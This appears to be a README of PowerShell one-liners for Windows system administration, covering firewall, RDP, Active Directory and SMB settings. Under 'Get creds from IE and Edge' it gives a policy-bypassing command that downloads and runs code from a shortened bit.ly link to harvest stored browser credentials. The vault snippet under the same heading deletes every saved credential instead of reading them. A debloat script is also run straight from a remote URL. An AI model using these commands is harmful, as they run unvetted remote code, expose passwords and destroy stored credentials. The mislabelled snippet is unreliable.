# Powershell-SysAdmin
SysAdmin stuff using the all powerful powershell. Commands that are hopefully helpful when administering a Windows environment.

## One-Liners

#### "Pong Command" - Listen for Pings. Uses WinDump.exe
```.\WinDump.exe -i 3 icmp and icmp[icmp-echoreply]=icmp-echo```

#### Enable File and Printer Sharing
```Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True```

#### Enable ICMP
```netsh advfirewall firewall add rule name="Allow incoming ping requests IPv4" dir=in action=allow protocol=icmpv4 ```

#### Remote Manage
##### RDP
```reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```

##### NLA
```Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\‘ -Name “UserAuthentication” -Value 1```

##### Firewall Rule
```Enable-NetFirewallRule -DisplayGroup “Remote Desktop”```

#### Bloatware Remover
```iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/debloat'))```

#### Get creds from IE and Edge
```powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"```
```
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] $vault = New-Object Windows.Security.Credentials.PasswordVault $vault.RetrieveAll() | ForEach {$vault.Remove($_)}
```

#### Count Mailboxes based on office or chosen property

```Get-Mailbox | Group-Object -Property:Office | Select-Object name,count```

#### Get all PC Names according to pattern (requires activedirectory module)
``` Get-ADComputer -Filter "Name -like 'PC-*'" | Select-String -Pattern PC-\d+```

##### Get all computer names
``` Get-ADComputer -Filter * | Select-Object -ExpandProperty Name ```

#### Get current logged on user
``` query user /server:$SERVER```

#### Get logged in users for each computer
```
$COMPUTER_LIST = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name

foreach ($COMPUTER in $COMPUTER_LIST) {
echo [$COMPUTER]
query user /server:$COMPUTER
echo `n
}
```

#### Get LastLogonDate/LastLogon for each computer
```
Get-ADComputer -Filter * -Properties * | Sort LastLogon | Select Name, LastLogonDate,@{Name='LastLogon';Expression={[DateTime]::FromFileTime($_.LastLogon)}}
```

### Get All Disabled Users (Excluding OU)
```Search-ADAccount -AccountDisabled -UsersOnly | Where {$_.DistinguishedName -notlike "*OU=Disabled Users,OU=USERS,DC=EXAMPLE,DC=COM"}```

#### Get LastLogon for User
```Get-ADUser -Identity “username” -Properties “LastLogonDate”```

#### Enable Hyper-V
```Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All```

#### Toggle SMBv1
```Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force```

#### Enable script execution 
```powershell.exe Set-ExecutionPolicy Bypass -Force```

#### Get REG key of any installed program
```
$keys = dir HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall | where { $_.GetValueNames() -contains 'DisplayName' }
$keys += dir HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall | where { $_.GetValueNames() -contains 'DisplayName' }
 
$k = $keys | where { $_.GetValue('DisplayName') -eq 'DISPLAYNAMEHERE' }
```

## Windows Defender
[Windows Defender is enough, if you harden it](https://gist.github.com/superswan/1d6ed59e75273f90a481428964be3ae5)
